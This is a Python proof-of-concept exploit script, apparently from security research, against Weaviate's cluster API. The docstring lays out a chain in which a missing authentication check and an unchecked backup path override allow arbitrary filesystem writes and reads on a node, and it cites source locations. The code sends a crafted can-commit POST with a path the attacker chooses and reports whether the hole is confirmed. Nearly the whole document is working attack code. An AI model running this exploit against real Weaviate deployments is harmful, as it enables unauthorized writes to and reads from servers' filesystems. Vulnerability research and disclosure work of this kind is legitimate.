#!/usr/bin/env python3
"""
Weaviate — unauthenticated cluster-API backup path override -> arbitrary
filesystem write/read on node (WE-1 + WE-4 chain)
=========================================================================
Prereqs (all default-ish):
  * CLUSTER_BASIC_AUTH_USERNAME/PASSWORD not set  -> cluster API auth off
    (usecases/cluster/state.go:191 BasicAuth.Enabled(); auth.go:34 handleFunc
    returns unwrapped handler)
  * cluster API binds ALL interfaces ":7947" (serve.go:149;
    DataBindPort = gossip+1, environment.go:2169)
  * backup-filesystem module enabled (BACKUP_MODULES contains
    "backup-filesystem"); its sink resolvePath() accepts ANY override path
    (modules/backup-filesystem/backup.go:27-36) and node-side OnCanCommit
    passes req.Path straight through (usecases/backup/handler.go:291)

Chain: POST /backups/can-commit  {"method":"create","id":"..","backend":
"filesystem","classes":[],"path":"/attacker/controlled"}  -> node runs
os.MkdirAll + file writes under the attacker path (arbitrary write, content
= backup meta/data). OpRestore variant + GetObject -> arbitrary file READ
(contents flow back through backup meta).

Usage:
  python3 poc_weaviate_backup_path.py <host> [port=7947] [path=/tmp/weaviate_pwn]
Only performs the WRITE-side can-commit probe; read the HTTP response JSON.
"""
import json
import sys
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7947
WRITE_PATH = sys.argv[3] if len(sys.argv) > 3 else "/tmp/weaviate_pwn_probe"
BASE = f"http://{HOST}:{PORT}"


def post(path, body):
    req = urllib.request.Request(
        BASE + path,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read(1024)
    except urllib.error.HTTPError as e:
        return e.code, e.read(1024)


def main():
    body = {
        "method": "create",
        "id": "poc_probe",
        "backend": "filesystem",
        "classes": [],
        "path": WRITE_PATH,
    }
    status, resp = post("/backups/can-commit", body)
    print(f"[*] POST /backups/can-commit (path={WRITE_PATH!r}) -> {status}")
    print(f"    {resp[:200]!r}")

    status0, _ = post("/backups/can-commit", {"method": "create"})
    print(f"[*] unauth baseline (no creds) status={status0} — "
          f"401 would indicate cluster auth enabled")

    if status == 200:
        print("\n[VULN CONFIRMED] can-commit accepted an arbitrary filesystem")
        print(f"    path override; check node filesystem for {WRITE_PATH}/")
        print("    (meta/data written under <path>/<id>/... via os.MkdirAll +")
        print("     writeFileViaTemp). OpRestore gives the read-side primitive.")


if __name__ == "__main__":
    main()
